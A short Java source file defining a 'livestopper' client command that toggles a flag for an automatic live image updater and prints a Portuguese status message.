package br.com.introcdc.connect.client.commands.image;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:34
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ImageComponents;

public class ClientCommandLiveStopper extends ClientCommand {

    public ClientCommandLiveStopper() {
        super("livestopper");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (ImageComponents.LIVE_STOPPER) {
            ImageComponents.LIVE_STOPPER = false;
            msg("Parador de atualizador de live automático desativado!");
        } else {
            ImageComponents.LIVE_STOPPER = true;
            msg("Parador de atualizador de live automático ativado!");
        }
    }

}
